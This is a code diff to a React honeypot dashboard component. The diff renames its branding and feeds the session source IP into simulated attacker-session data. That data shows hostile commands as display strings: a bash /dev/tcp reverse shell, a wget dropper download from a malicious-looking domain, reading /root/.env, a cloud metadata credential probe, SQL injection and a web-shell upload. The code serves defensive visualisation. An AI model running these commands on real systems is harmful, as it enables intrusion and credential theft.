@@ -81,12 +81,12 @@ function getSimulatedCommandsForSession(sessionData) {
   const events = sessionData?.events || [];
   const rawCmds = events.map(e => e.event || e.command || e.raw_payload).filter(Boolean);
 
-  if (rawCmds.length >= 2) {
+  if (rawCmds.length >= 1) {
     return rawCmds.map((c, i) => ({
       step: i + 1,
       cmd: c,
       output: c.includes('env') ? 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
-        : c.includes('uname') ? 'Linux trinetra-core-jumpbox 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux'
+        : c.includes('uname') ? 'Linux kurukshetra-honeypot-node01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux'
         : c.includes('whoami') ? 'root'
         : c.includes('id') ? 'uid=0(root) gid=0(root) groups=0(root)'
         : c.includes('wget') || c.includes('curl') ? 'HTTP/1.1 200 OK [Downloaded 48.2 KB payload.sh] -> Staged in /tmp'
@@ -107,17 +107,17 @@ function getSimulatedCommandsForSession(sessionData) {
       { step: 2, cmd: 'GET /canary_passwords.txt HTTP/1.1', output: 'admin:SuperSecret2026! [DECOY HONEYTOKEN TRIGGERED]', tag: 'CANARY CREDENTIAL THEFT', risk: 'CRITICAL', timestamp: 'T+14s' },
       { step: 3, cmd: "POST /login.php ' OR '1'='1' --", output: 'HTTP/1.1 302 Found -> Location: /dashboard (Decoy session opened)', tag: 'SQL INJECTION TAUTOLOGY', risk: 'HIGH', timestamp: 'T+28s' },
       { step: 4, cmd: 'curl -X POST -F "file=@backdoor.php" http://target/upload', output: '{"status":"success", "path":"/uploads/backdoor.php"}', tag: 'WEB SHELL PERSISTENCE', risk: 'CRITICAL', timestamp: 'T+45s' },
-      { step: 5, cmd: 'python3 -c "import socket,subprocess,os;s=socket.socket()..."', output: '[CONTAINMENT ENFORCED] Socket quarantined by TRINETRA Active Defense Grid', tag: 'REVERSE TCP EXECUTION', risk: 'CRITICAL', timestamp: 'T+58s' },
+      { step: 5, cmd: 'python3 -c "import socket,subprocess,os;s=socket.socket()..."', output: '[CONTAINMENT ENFORCED] Socket quarantined by KURUKSHETRA Active Defense Grid', tag: 'REVERSE TCP EXECUTION', risk: 'CRITICAL', timestamp: 'T+58s' },
     ];
   }
 
   return [
-    { step: 1, cmd: 'ssh root@185.220.101.5:2222 (Dictionary Brute-force)', output: 'Authentication succeeded for root (Decoy jail session)', tag: 'INITIAL CREDENTIAL ACCESS', risk: 'HIGH', timestamp: 'T+00s' },
-    { step: 2, cmd: 'whoami && uname -a', output: 'root\nLinux trinetra-node-01 5.15.0-generic x86_64 GNU/Linux', tag: 'SYSTEM DISCOVERY (T1082)', risk: 'LOW', timestamp: 'T+12s' },
+    { step: 1, cmd: `ssh root@${sessionData?.source_ip || '185.220.101.5'}:2222 (Dictionary Brute-force)`, output: 'Authentication succeeded for root (Decoy jail session)', tag: 'INITIAL CREDENTIAL ACCESS', risk: 'HIGH', timestamp: 'T+00s' },
+    { step: 2, cmd: 'whoami && uname -a', output: 'root\nLinux kurukshetra-node-01 5.15.0-generic x86_64 GNU/Linux', tag: 'SYSTEM DISCOVERY (T1082)', risk: 'LOW', timestamp: 'T+12s' },
     { step: 3, cmd: 'cat /root/.env', output: 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n[CANARY HONEYTOKEN LOGGED]', tag: 'HONEYTOKEN CANARY TRIPPED', risk: 'CRITICAL', timestamp: 'T+25s' },
     { step: 4, cmd: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', output: 'ProductionRole [Emulated Cloud Metadata Response]', tag: 'CLOUD IMDS THEFT PROBE', risk: 'CRITICAL', timestamp: 'T+38s' },
     { step: 5, cmd: 'wget http://cdn.malicious-domain.cc/tools/dropper.sh && chmod +x dropper.sh', output: 'Saving to: ‘dropper.sh’ [4.2 KB] -> Stored in forensic memory buffer', tag: 'INGRESS TOOL TRANSFER (T1105)', risk: 'CRITICAL', timestamp: 'T+52s' },
-    { step: 6, cmd: 'bash -i >& /dev/tcp/185.220.101.5/9001 0>&1', output: '[ISOLATED] Automated session kill rule executed. Attacker sandboxed.', tag: 'INTERACTIVE REVERSE SHELL', risk: 'CRITICAL', timestamp: 'T+65s' },
+    { step: 6, cmd: `bash -i >& /dev/tcp/${sessionData?.source_ip || '185.220.101.5'}/9001 0>&1`, output: '[ISOLATED] Automated session kill rule executed. Attacker sandboxed.', tag: 'INTERACTIVE REVERSE SHELL', risk: 'CRITICAL', timestamp: 'T+65s' },
   ];
 }
 
@@ -181,7 +181,7 @@ export default function AttackInvestigation({ sessionData, onContainSession }) {
   const isContained = (status || '').toUpperCase() === 'CONTAINED';
   const riskTimelineData = buildRiskTimeline(events, risk_score || 85);
 
-  const firewallCommand = `sudo ufw insert 1 deny from ${source_ip || '0.0.0.0'} to any comment 'TRINETRA Honeypot Auto-Drop'`;
+  const firewallCommand = `sudo ufw insert 1 deny from ${source_ip || '0.0.0.0'} to any comment 'KURUKSHETRA Honeypot Auto-Drop'`;
 
   const copyFirewallRule = async () => {
     await navigator.clipboard.writeText(firewallCommand).catch(() => {});
@@ -238,7 +238,7 @@ export default function AttackInvestigation({ sessionData, onContainSession }) {
                 {isContained && <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800">CONTAINED</span>}
               </div>
               <div className="flex items-center gap-2 mt-1.5 flex-wrap text-xs">
-                <span className="font-mono text-sm font-bold text-blue-600">{source_ip || '185.220.101.5'}</span>
+                <span className="font-mono text-sm font-bold text-blue-600">{source_ip || sessionData?.source_ip || '185.220.101.5'}</span>
                 <CopyBtn text={source_ip || ''} />
                 <span className="text-neutral-400">→</span>
                 <span className="px-2.5 py-0.5 rounded-full bg-neutral-100 text-neutral-800 text-[10px] font-bold uppercase">
@@ -298,7 +298,7 @@ export default function AttackInvestigation({ sessionData, onContainSession }) {
             </div>
             <span className="text-xs font-mono font-bold text-neutral-300 ml-2 flex items-center gap-2">
               <Terminal className="w-4 h-4 text-[#f8c858]" />
-              TRINETRA Virtual Decoy Terminal · Live Attacker Keystroke Replay
+              KURUKSHETRA Virtual Decoy Terminal · Live Attacker Keystroke Replay
             </span>
           </div>
 
@@ -351,7 +351,7 @@ export default function AttackInvestigation({ sessionData, onContainSession }) {
         {/* Terminal Screen Body */}
         <div className="p-5 sm:p-6 font-mono text-xs space-y-4 max-h-[420px] overflow-y-auto bg-black/90 selection:bg-emerald-500 selection:text-black">
           <div className="text-neutral-500 pb-2 border-b border-neutral-900 flex items-center justify-between text-[11px]">
-            <span>Session: {session_id} · Source IP: {source_ip || '185.220.101.5'}</span>
+            <span>Session: {session_id} · Source IP: {source_ip || sessionData?.source_ip || '185.220.101.5'}</span>
             <span className="text-emerald-400 font-bold">● DECEPTION TRAP ACTIVE</span>
           </div>
 
@@ -562,7 +562,7 @@ export default function AttackInvestigation({ sessionData, onContainSession }) {
         </div>
         <div className="flex flex-wrap gap-2.5">
           {[
-            { type: 'IP', val: source_ip || '185.220.101.5' },
+            { type: 'IP', val: source_ip || sessionData?.source_ip || '185.220.101.5' },
             { type: 'FILE', val: '/root/.env' },
             { type: 'URL', val: 'http://cdn.malicious-domain.cc/tools/dropper.sh' },
             { type: 'SHA256', val: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
